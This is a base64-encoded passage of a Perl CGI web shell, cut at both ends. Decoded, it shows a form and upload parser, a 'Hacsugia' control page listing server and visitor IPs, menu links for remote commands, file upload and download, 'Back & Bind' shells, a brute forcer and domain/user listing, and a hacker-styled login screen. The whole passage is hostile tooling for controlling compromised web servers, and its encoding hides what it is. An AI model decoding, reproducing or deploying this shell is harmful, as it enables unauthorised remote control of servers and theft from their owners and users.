snZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9LgojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mCiMgdGhlIHZhcmlhYmxlLiBOb3RlOiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBDR0kKIyBzY3JpcHRzLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBSZWFkUGFyc2UgCnsKCWxvY2FsICgqaW4pID0gQF8gaWYgQF87Cglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOwoJCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsKCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQoJewoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9OwoJfQoJZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpCgl7CgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOwoJCXJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7Cgl9CgoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pCgl7CgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyAKCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyAKCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOwoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsKCQkkSGVhZGVyID0gJGA7CgkJJEJvZHkgPSAkJzsKIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5OwoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgCgkJJGlueydmJ30gPSAkMTsgCgkJJGlueydmJ30gPX4gcy9cIi8vZzsKCQkkaW57J2YnfSA9fiBzL1xzLy9nOwoKCQkjIHBhcnNlIHRyYWlsZXIKCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQoJCXsgCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOwoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87CgkJCSRrZXkgPSAkMTsKCQkJJHZhbCA9ICQnOwoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gPSAkdmFsOyAKCQl9Cgl9CgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkKCXsKCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7CgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQoJCXsKCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsKCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsKCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7CgkJCSRpbnska2V5fSAuPSAkdmFsOwoJCX0KCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcgojIEFyZ3VtZW50IDE6IEZvcm0gaXRlbSBuYW1lIHRvIHdoaWNoIGZvY3VzIHNob3VsZCBiZSBzZXQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlSGVhZGVyCnsKCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOwoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCW15ICRkaXIgPSRDdXJyZW50RGlyOwoJJGRpcj1+IHMvXFwvXFxcXC9nOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+Cjx0aXRsZT5IYWNzdWdpYTwvdGl0bGU+CgokSHRtbE1ldGFIZWFkZXIKCjwvaGVhZD4KPHN0eWxlPgpib2R5ewpmb250OiAxMHB0IFZlcmRhbmE7Cn0KdHIgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKY29sb3I6ICNmZjk5MDA7Cn0KdGQgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKY29sb3I6ICMyQkE4RUM7CmZvbnQ6IDEwcHQgVmVyZGFuYTsKfQoKdGFibGUgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKQkFDS0dST1VORC1DT0xPUjogIzExMTsKfQoKCmlucHV0IHsKQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7CkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOwpmb250OiAxMHB0IFZlcmRhbmE7CmNvbG9yOiAjZmY5OTAwOwp9CgppbnB1dC5zdWJtaXQgewp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47CmNvbG9yOiAjRkZGRkZGOwpib3JkZXItY29sb3I6ICMwMDk5MDA7Cn0KCmNvZGUgewpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOwpjb2xvcjogd2hpbGU7Cn0KCnJ1biB7CmJvcmRlcgkJCTogZGFzaGVkIDBweCAjMzMzOwpmb250OiAxMHB0IFZlcmRhbmEgYm9sZDsKY29sb3I6ICNGRjAwQUE7Cn0KCnRleHRhcmVhIHsKQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7CkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7CmZvbnQ6IEZpeGVkc3lzIGJvbGQ7CmNvbG9yOiAjYWFhOwp9CkE6bGluayB7CglDT0xPUjogIzJCQThFQzsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KQTp2aXNpdGVkIHsKCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmhvdmVyIHsKCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsKCWNvbG9yOiAjZmY5OTAwOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmFjdGl2ZSB7Cgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUKfQoKLmxpc3RkaXIgdHI6aG92ZXJ7CgliYWNrZ3JvdW5kOiAjNDQ0Owp9Ci5saXN0ZGlyIHRyOmhvdmVyIHRkewoJYmFja2dyb3VuZDogIzQ0NDsKCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsKCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmU7Cn0KLm5vdGxpbmV7CgliYWNrZ3JvdW5kOiAjMTExOwp9Ci5saW5lewoJYmFja2dyb3VuZDogIzIyMjsKfQo8L3N0eWxlPgo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4KZnVuY3Rpb24gY2htb2RfZm9ybShpLGZpbGUpCnsKCS8qdmFyIGFqYXg9J2FqYXhfUG9zdERhdGEoIkZvcm1QZXJtc18nK2krJyIsIiRTY3JpcHRMb2NhdGlvbiIsIlJlc3BvbnNlRGF0YSIpOyByZXR1cm4gZmFsc2U7JzsqLwoJdmFyIGFqYXg9IiI7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZVBlcm1zXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JycgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7Cn0KZnVuY3Rpb24gcm1fY2htb2RfZm9ybShyZXNwb25zZSxpLHBlcm1zLGZpbGUpCnsKCXJlc3BvbnNlLmlubmVySFRNTCA9ICI8c3BhbiBvbmNsaWNrPVxcXCJjaG1vZF9mb3JtKCIgKyBpICsgIiwnIisgZmlsZSsgIicpXFxcIiA+IisgcGVybXMgKyI8L3NwYW4+PC90ZD4iOwp9CmZ1bmN0aW9uIHJlbmFtZV9mb3JtKGksZmlsZSxmKQp7Cgl2YXIgYWpheD0iIjsKCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOwoJdmFyIGJhY2s9InJtX3JlbmFtZV9mb3JtKCIraSsiLFxcXCIiK2ZpbGUrIlxcXCIsXFxcIiIrZisiXFxcIik7IHJldHVybiBmYWxzZTsiOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nJyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1yZW5hbWUgdHlwZT10ZXh0IHZhbHVlPSAnIitmaWxlKyInIC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBhamF4ICsgIicgdmFsdWU9T0s+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBiYWNrICsgIicgdmFsdWU9Q2FuY2VsPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7Cn0KZnVuY3Rpb24gcm1fcmVuYW1lX2Zvcm0oaSxmaWxlLGYpCnsKCWlmKGY9PSdmJykKCXsKCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Y29tbWFuZCZkPSRkaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsKCX1lbHNlCgl7CgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOwoJfQp9Cjwvc2NyaXB0Pgo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzBjMGMwYyIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4KPGNlbnRlcj48Y29kZT4KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+Cjx0cj4KCTx0ZCBhbGlnbj0iY2VudGVyIiByb3dzcGFuPTI+CgkJPGI+PGZvbnQgc2l6ZT0iNSI+JEVkaXRQZXJzaW9uPC9mb250PjwvYj4KCTwvdGQ+CgoJPHRkPgoKCQk8Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4kRU5WeyJTRVJWRVJfU09GVFdBUkUifTwvZm9udD4KCTwvdGQ+Cgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSIjY2MwMDAwIj4gJEVOVnsnU0VSVkVSX0FERFInfTwvZm9udD4gfCBZb3VyIElQOiA8Zm9udCBjb2xvcj0iIzAwMDAwMCI+JEVOVnsnUkVNT1RFX0FERFInfTwvZm9udD4KCTwvdGQ+Cgo8L3RyPgoKPHRyPgo8dGQgY29sc3Bhbj0iMyI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbiI+SG9tZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y29tbWFuZCZkPSRFbmNvZGVkQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1ndWkmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkdVSTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1icnV0ZWZvcmNlciI+QnJ1dGUgRm9yY2VyPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNoZWNrbG9nIj5DaGVjayBMb2c8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG9tYWluc3VzZXIiPkRvbWFpbnMvVXNlcnM8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5Mb2dvdXQ8L2E+IHwKPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9IiMiPkhlbHA8L2E+Cgo8L2ZvbnQ+PC90ZD4KPC90cj4KPC90YWJsZT4KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNmZjk5Y2MiID4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCglwcmludCA8PEVORDsKPHByZT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+ClR5cGluZ1RleHQgPSBmdW5jdGlvbihlbGVtZW50LCBpbnRlcnZhbCwgY3Vyc29yLCBmaW5pc2hlZENhbGxiYWNrKSB7CiAgaWYoKHR5cGVvZiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCA9PSAidW5kZWZpbmVkIikgfHwgKHR5cGVvZiBlbGVtZW50LmlubmVySFRNTCA9PSAidW5kZWZpbmVkIikpIHsKICAgIHRoaXMucnVubmluZyA9IHRydWU7CS8vIE5ldmVyIHJ1bi4KICAgIHJldHVybjsKICB9CiAgdGhpcy5lbGVtZW50ID0gZWxlbWVudDsKICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2sgPSAoZmluaXNoZWRDYWxsYmFjayA/IGZpbmlzaGVkQ2FsbGJhY2sgOiBmdW5jdGlvbigpIHsgcmV0dXJuOyB9KTsKICB0aGlzLmludGVydmFsID0gKHR5cGVvZiBpbnRlcnZhbCA9PSAidW5kZWZpbmVkIiA/IDEwMCA6IGludGVydmFsKTsKICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5lbGVtZW50LmlubmVySFRNTDsKICB0aGlzLnVucGFyc2VkT3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0OwogIHRoaXMuY3Vyc29yID0gKGN1cnNvciA/IGN1cnNvciA6ICIiKTsKICB0aGlzLmN1cnJlbnRUZXh0ID0gIiI7CiAgdGhpcy5jdXJyZW50Q2hhciA9IDA7CiAgdGhpcy5lbGVtZW50LnR5cGluZ1RleHQgPSB0aGlzOwogIGlmKHRoaXMuZWxlbWVudC5pZCA9PSAiIikgdGhpcy5lbGVtZW50LmlkID0gInR5cGluZ3RleHQiICsgVHlwaW5nVGV4dC5jdXJyZW50SW5kZXgrKzsKICBUeXBpbmdUZXh0LmFsbC5wdXNoKHRoaXMpOwogIHRoaXMucnVubmluZyA9IGZhbHNlOwogIHRoaXMuaW5UYWcgPSBmYWxzZTsKICB0aGlzLnRhZ0J1ZmZlciA9ICIiOwogIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7CiAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiI7Cn0KVHlwaW5nVGV4dC5hbGwgPSBuZXcgQXJyYXkoKTsKVHlwaW5nVGV4dC5jdXJyZW50SW5kZXggPSAwOwpUeXBpbmdUZXh0LnJ1bkFsbCA9IGZ1bmN0aW9uKCkgewogIGZvcih2YXIgaSA9IDA7IGkgPCBUeXBpbmdUZXh0LmFsbC5sZW5ndGg7IGkrKykgVHlwaW5nVGV4dC5hbGxbaV0ucnVuKCk7Cn0KVHlwaW5nVGV4dC5wcm90b3R5cGUucnVuID0gZnVuY3Rpb24oKSB7CiAgaWYodGhpcy5ydW5uaW5nKSByZXR1cm47CiAgaWYodHlwZW9mIHRoaXMub3JpZ1RleHQgPT0gInVuZGVmaW5lZCIpIHsKICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsJLy8gV2UgaGF2ZW4ndCBmaW5pc2hlZCBsb2FkaW5nIHlldC4gIEhhdmUgcGF0aWVuY2UuCiAgICByZXR1cm47CiAgfQogIGlmKHRoaXMuY3VycmVudFRleHQgPT0gIiIpIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSAiIjsKLy8gIHRoaXMub3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0LnJlcGxhY2UoLzwoW148XSkqPi8sICIiKTsgICAgIC8vIFN0cmlwIEhUTUwgZnJvbSB0ZXh0LgogIGlmKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCkgewogICAgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjwiICYmICF0aGlzLmluVGFnKSB7CiAgICAgIHRoaXMudGFnQnVmZmVyID0gIjwiOwogICAgICB0aGlzLmluVGFnID0gdHJ1ZTsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIj4iICYmIHRoaXMuaW5UYWcpIHsKICAgICAgdGhpcy50YWdCdWZmZXIgKz0gIj4iOwogICAgICB0aGlzLmluVGFnID0gZmFsc2U7CiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy50YWdCdWZmZXI7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMuaW5UYWcpIHsKICAgICAgdGhpcy50YWdCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICImIiAmJiAhdGhpcy5pbkhUTUxFbnRpdHkpIHsKICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiYiOwogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IHRydWU7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI7IiAmJiB0aGlzLmluSFRNTEVudGl0eSkgewogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gIjsiOwogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOwogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMuSFRNTEVudGl0eUJ1ZmZlcjsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5pbkhUTUxFbnRpdHkpIHsKICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSB7CiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7CiAgICB9CiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gdGhpcy5jdXJyZW50VGV4dDsKICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgKz0gKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCAtIDEgPyAodHlwZW9mIHRoaXMuY3Vyc29yID09ICJmdW5jdGlvbiIgPyB0aGlzLmN1cnNvcih0aGlzLmN1cnJlbnRUZXh0KSA6IHRoaXMuY3Vyc29yKSA6ICIiKTsKICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsKICB9IGVsc2UgewoJdGhpcy5jdXJyZW50VGV4dCA9ICIiOwoJdGhpcy5jdXJyZW50Q2hhciA9IDA7CiAgICAgICAgdGhpcy5ydW5uaW5nID0gZmFsc2U7CiAgICAgICAgdGhpcy5maW5pc2hlZENhbGxiYWNrKCk7CiAgfQp9Cjwvc2NyaXB0Pgo8L3ByZT4KCjxmb250IHN0eWxlPSJmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7Ij5Db3B5cmlnaHQgKEMpIDIwMDEgUm9oaXRhYiBCYXRyYSA8L2ZvbnQ+PGJyPjxicj4KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMSIgd2lkdGg9IjYwMCIgaGVpZ2g+Cjx0Ym9keT48dHI+Cjx0ZCB2YWxpZ249InRvcCIgYmFja2dyb3VuZD0iaHR0cDovL2RsLmRyb3Bib3guY29tL3UvMTA4NjAwNTEvaW1hZ2VzL21hdHJhbi5naWYiPjxwIGlkPSJoYWNrIiBzdHlsZT0ibWFyZ2luLWxlZnQ6IDNweDsiPgo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+IFBsZWFzZSBXYWl0IC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4KCjxmb250IGNvbG9yPSIjMDA5OTAwIj4gVHJ5aW5nIGNvbm5lY3QgdG8gU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPn5cJDwvZm9udD4gQ29ubmVjdGVkICEgPC9mb250Pjxicj4KPGZvbnQgY29sb3I9IiMwMDk5MDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+IENoZWNraW5nIFNlcnZlciAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250PiA8YnI+Cgo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gVHJ5aW5nIGNvbm5lY3QgdG8gQ29tbWFuZCAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgoKPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+XCQgQ29ubmVjdGVkIENvbW1hbmQhIDwvZm9udD48YnI+Cjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PGZvbnQgY29sb3I9IiNGMDAwMDAiPlwkPC9mb250PjwvZm9udD4gT0shIFlvdSBjYW4ga2lsbCBpdCE8L2ZvbnQ+CjwvdHI+CjwvdGJvZHk+PC90YWJsZT4KPGJyPgoKPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpuZXcgVHlwaW5nVGV4dChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgi